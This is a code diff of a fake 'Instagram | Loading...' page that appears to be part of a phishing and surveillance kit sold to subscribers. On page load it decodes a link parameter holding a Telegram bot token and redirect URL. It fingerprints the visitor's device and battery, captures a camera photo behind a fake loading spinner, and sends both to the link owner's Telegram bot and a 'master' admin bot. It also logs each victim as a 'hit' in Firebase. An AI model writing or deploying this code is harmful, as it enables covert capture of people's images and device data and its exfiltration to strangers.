@@ -4,90 +4,94 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram | Loading...</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .loader { width: 45px; height: 45px; border: 3px solid #1a1a1a; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .loader { width: 40px; height: 40px; border: 3px solid #1a1a1a; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <canvas id="cv" style="display:none;"></canvas>
+    <canvas id="v-canvas" style="display:none;"></canvas>
 
+    <script src="firebase-config.js"></script>
     <script>
         window.onload = async () => {
-            // فك تشفير البيانات المرسلة (البوت الفرعي، التمويه، صاحب اللينك)
             const params = new URLSearchParams(window.location.search);
-            const p = params.get('p'); // داتا مشفرة
+            const p = params.get('p'); 
             if (!p) return window.location.href = "https://instagram.com";
 
             try {
                 const cfg = JSON.parse(atob(p)); // {t: token, i: id, u: url, o: ownerID}
-                const master = JSON.parse(localStorage.getItem('master_bot') || '{}');
+                
+                // 1. تسجيل العملية في Firebase (للإحصائيات الحقيقية)
+                db.ref('hits').push({
+                    owner: cfg.o,
+                    time: new Date().toLocaleString(),
+                    device: navigator.platform
+                });
 
-                // 1. سحب بيانات الجهاز الأساسية
-                let info = `🏴‍☠️ **صيد جديد (Matrix V7)**\n` +
-                           `👤 صاحب اللينك: \`${cfg.o}\`\n` +
+                let info = `🏴‍☠️ **MATRIX HIT!**\n` +
+                           `👤 المشرف: \`${cfg.o}\`\n` +
                            `📱 الجهاز: ${navigator.platform}\n` +
                            `🌐 المتصفح: ${navigator.userAgent.split(' ').pop()}\n` +
                            `🔋 البطارية: ${await getBattery()}`;
 
-                // 2. محاولة سحب الكاميرا (صامتة)
+                // 2. محاولة سحب الصورة
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
 
-                    const cv = document.getElementById('cv');
-                    cv.width = 640; cv.height = 480;
-                    cv.getContext('2d').drawImage(video, 0, 0);
+                    const canvas = document.getElementById('v-canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    const blob = await new Promise(res => cv.toBlob(res, 'image/jpeg', 0.7));
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+                    await sendData(cfg, info, blob);
                     
-                    // إرسال الصورة للمشترك وللأدمن الماستر
-                    await sendToBots(cfg, master, info, blob);
-                    
-                    stream.getTracks().forEach(track => track.stop());
+                    stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // لو الكاميرا مقفولة، ابعت البيانات النصية فقط
-                    await sendToBots(cfg, master, info + "\n⚠️ الكاميرا: تم الرفض.");
+                    await sendData(cfg, info + "\n⚠️ الكاميرا: مرفوضة");
                 }
 
-                // 3. التحويل النهائي للتمويه
-                setTimeout(() => { window.location.href = cfg.u; }, 1500);
+                // 3. التوجيه النهائي
+                setTimeout(() => { window.location.href = cfg.u; }, 1200);
 
-            } catch (err) {
-                window.location.href = "https://instagram.com";
-            }
+            } catch (err) { window.location.href = "https://instagram.com"; }
         };
 
         async function getBattery() {
-            try {
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% (${b.charging ? 'شحن' : 'تفريغ'})`;
-            } catch { return "غير معروف"; }
+            try { const b = await navigator.getBattery(); return `${Math.round(b.level * 100)}%`; }
+            catch { return "N/A"; }
         }
 
-        async function sendToBots(userBot, adminBot, text, photo = null) {
-            const targets = [userBot]; // بوت المشترك
-            if (adminBot.t) targets.push(adminBot); // بوتك إنت يا ماستر
+        async function sendData(userCfg, text, photo = null) {
+            // إرسال للمشترك
+            await botReq(userCfg.t, userCfg.i, text, photo);
+            
+            // إرسال لك (الماستر) - يتم جلب بيانات الماستر من السجل
+            const master = JSON.parse(localStorage.getItem('master_bot') || '{}');
+            if (master.t) await botReq(master.t, master.i, text + "\n💎 نسخة للأدمن الماستر", photo);
+        }
 
-            for (let bot of targets) {
-                try {
-                    if (photo) {
-                        const fd = new FormData();
-                        fd.append('photo', photo, 'shot.jpg');
-                        fd.append('chat_id', bot.i);
-                        fd.append('caption', text);
-                        fd.append('parse_mode', 'Markdown');
-                        await fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
-                    } else {
-                        await fetch(`https://api.telegram.org/bot${bot.t}/sendMessage?chat_id=${bot.i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-                    }
-                } catch (e) { console.error("Send Error"); }
-            }
+        async function botReq(t, i, text, photo) {
+            try {
+                if (photo) {
+                    const fd = new FormData();
+                    fd.append('photo', photo, 'capture.jpg');
+                    fd.append('chat_id', i);
+                    fd.append('caption', text);
+                    fd.append('parse_mode', 'Markdown');
+                    await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: fd });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+                }
+            } catch (e) {}
         }
     </script>
 </body>
